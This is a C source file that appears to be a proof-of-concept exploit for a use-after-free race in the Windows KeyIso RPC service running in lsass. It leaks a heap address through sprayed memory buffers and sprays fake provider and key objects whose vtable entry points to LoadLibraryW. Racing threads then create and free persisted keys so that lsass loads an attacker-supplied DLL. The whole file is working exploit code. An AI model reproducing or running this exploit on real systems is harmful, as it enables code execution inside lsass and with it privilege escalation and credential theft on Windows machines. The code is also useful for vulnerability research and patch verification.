#include <Windows.h>
#include <stdio.h>

#include "hax.h"
#include "keyiso_h.h"
#include "rpc.h"

#pragma comment(lib, "rpcrt4.lib")

#define RACETHREADS         0x5
#define PROVIDERSPRAYCOUNT  0x100
#define MEMBUFSPRAYCOUNT    0x100
#define DLLPATH             L"C:\\Users\\User\\Desktop\\hax.dll"

DWORD g_Stop = 0;

int main(void)
{
    RPC_BINDING_HANDLE      hBinding = NULL;
    PVOID                   controlContextHandle = NULL;
    PVOID                   controlProviderHandle = NULL;
    PVOID                   providerHandles[PROVIDERSPRAYCOUNT] = { 0 };
    PVOID                   spareProviderHandles[PROVIDERSPRAYCOUNT] = { 0 };
    RPC_STATUS              status = RPC_S_OK;
    ULONG_PTR               providerAddress = 0;
    PROVIDEROBJECT          fakeProviderObject = { 0 };
    CTX                     ctx = { 0 };
    HANDLE                  hTimer = NULL;

    hBinding = GetBindingHandle();
    if (!hBinding)
        goto out;
    printf("[+] Acquired RPC Binding Handle : 0x%llx\n", (ULONG64)hBinding);

    status = CreateContextObject(hBinding, &controlContextHandle);
    if (!RPC_SUCCESS(status))
        goto out;
    printf("[+] Created control Context Object : 0x%llx\n", (ULONG64)controlContextHandle);

    status = CreateProviderObject(hBinding, controlContextHandle, &controlProviderHandle);
    if (!RPC_SUCCESS(status))
        goto out;
    puts("[+] Created control Provider Object");

    for (int i = 0; i < PROVIDERSPRAYCOUNT; i++) {
        status = CreateProviderObject(hBinding, controlContextHandle, &providerHandles[i]);
        if (!RPC_SUCCESS(status))
            goto out;
    }
    printf("[*] Sprayed %d Provider Objects\n", PROVIDERSPRAYCOUNT);

    providerAddress = LeakProviderAddress(hBinding, controlContextHandle, providerHandles[0x82]); // lucky number
    printf("[+] Leaked Provider Object address : 0x%llx\n", providerAddress);

    if (providerAddress < 0xffffffff) {
        puts("[-] Failed leak, launch exploit again.");
        goto out;
    }
    
    for (int i = 0; i < PROVIDERSPRAYCOUNT; i += 2) {
        status = FreeProviderObject(hBinding, controlContextHandle, providerHandles[i]);
        if (!RPC_SUCCESS(status))
            goto out;
    }
    printf("[*] Freed %d Provider Objects\n", PROVIDERSPRAYCOUNT /2);
    
    // UAF leads to (fakeProviderObject.vtable[8])(*(fakeProviderObject.unknownBuf3))
    // Write dll path to fakeProviderObject + 0x20 to prevent clobbering of recount
    memset(&fakeProviderObject, 'A', sizeof(fakeProviderObject));
    RtlCopyMemory((ULONG64)&fakeProviderObject + 0x20, DLLPATH, (wcslen(DLLPATH) + 1) * sizeof(WCHAR));
    fakeProviderObject.vtable[8] = GetProcAddress(GetModuleHandleW(L"KernelBase.dll"), "LoadLibraryW");
    fakeProviderObject.refcount = 1; // Without this lsass will try to double free our fake provider leading to OS crash
    *(PULONG_PTR)fakeProviderObject.unknownBuf3 = providerAddress + 0x20;

    for (int i = 1; i < PROVIDERSPRAYCOUNT; i += 2)
        SetUseContextProperty(hBinding, controlContextHandle, providerHandles[i], &fakeProviderObject, sizeof(fakeProviderObject));
    for (int i = 0; i < PROVIDERSPRAYCOUNT; i++)
        SetUseContextProperty(hBinding, controlContextHandle, spareProviderHandles[i], &fakeProviderObject, sizeof(fakeProviderObject));
    printf("[*] Sprayed %d Fake Provider Objects\n", PROVIDERSPRAYCOUNT/2 + PROVIDERSPRAYCOUNT);

    ctx.contextHandle = controlContextHandle;
    ctx.hBinding = hBinding;
    ctx.fakeProviderAddress = providerAddress;
    for (int i = 0; i < RACETHREADS * 2; i++)
        CreateThread(NULL, 0, RaceSprayFakeKey, &ctx, 0, NULL);

    CreateRaceThreads(hBinding);

    puts("[*] Attempting race for 1 minute");
    Sleep(1000 * 60 * 1);
    g_Stop = 1;

    puts("[+] End of attempt");

out:
    if (hBinding)
        RpcBindingFree(&hBinding);

    return 0;
}

ULONG_PTR LeakProviderAddress(RPC_BINDING_HANDLE hBinding, PVOID ContextHandle, PVOID ProviderHandle)
{
    ULONG_PTR addrs[MEMBUFSPRAYCOUNT] = { 0 };
    char      buf[0x30] = { 0 };
    char      outBuf[0x40] = { 0 };
    DWORD     written = 0;

    // membuf chunk size is 0x30, so we spray 0x30 sized property
    memset(&buf, 'A', 0x30);

    for (int i = 0; i < MEMBUFSPRAYCOUNT; i++)
        CreateMemoryBuffer(hBinding, ContextHandle, ProviderHandle, &addrs[i]);
    printf("[*] Sprayed %d Memory Buffers\n", MEMBUFSPRAYCOUNT);

    for (int i = 0; i < MEMBUFSPRAYCOUNT; i += 2)
        FreeMemoryBuffer(hBinding, ContextHandle, addrs[i]);
    printf("[*] Freed %d Memory Buffers\n", MEMBUFSPRAYCOUNT / 2);

    SetUseContextProperty(hBinding, ContextHandle, ProviderHandle, &buf, sizeof(buf));
    printf("[*] Set Use Context property, size written = %d\n", sizeof(buf));

    GetUseContextProperty(hBinding, ContextHandle, ProviderHandle, &outBuf, sizeof(outBuf), &written);
    printf("[+] Retrieved Use Context property, size received = %d\n", written);

    for (int i = 1; i < MEMBUFSPRAYCOUNT; i += 2)
        FreeMemoryBuffer(hBinding, ContextHandle, addrs[i]); // cleanup to release refs on provider

    return *(PULONG_PTR)(outBuf + 0x30);
}

void CreateRaceThreads(RPC_BINDING_HANDLE hBinding)
{
    CTX ctx = { 0 };

    ctx.hBinding = hBinding;
    CreateContextObject(hBinding, &ctx.contextHandle);
    CreateProviderObject(hBinding, ctx.contextHandle, &ctx.providerHandle);

    CreateThread(NULL, 0, RaceCreatePersistedKey, &ctx, 0, NULL);

    for (int i = 0; i < RACETHREADS; i++)
        CreateThread(NULL, 0, RaceFreePersistedKey, &ctx, 0, NULL);
}

void RaceFreePersistedKey(PCTX ctx)
{
    while (!g_Stop)
        FreePersistedKey(ctx->hBinding, ctx->contextHandle, ctx->providerHandle, ctx->keyHandle+1);
}

void RaceCreatePersistedKey(PCTX ctx)
{
    while (!g_Stop)
        CreatePersistedKey(ctx->hBinding, ctx->contextHandle, ctx->providerHandle, &ctx->keyHandle);
}

void RaceSprayFakeKey(PCTX ctx)
{
    PVOID     providerHandle = NULL;
    KEYOBJECT fakeKeyObject = { 0 };
    memset(&fakeKeyObject, 'A', sizeof(fakeKeyObject));

    fakeKeyObject.refcount = 1;
    fakeKeyObject.provider = ctx->fakeProviderAddress;

    while (!g_Stop) {
        CreateProviderObject(ctx->hBinding, ctx->contextHandle, &providerHandle);
        SetUseContextProperty(ctx->hBinding, ctx->contextHandle, providerHandle, &fakeKeyObject, sizeof(fakeKeyObject));
    }
}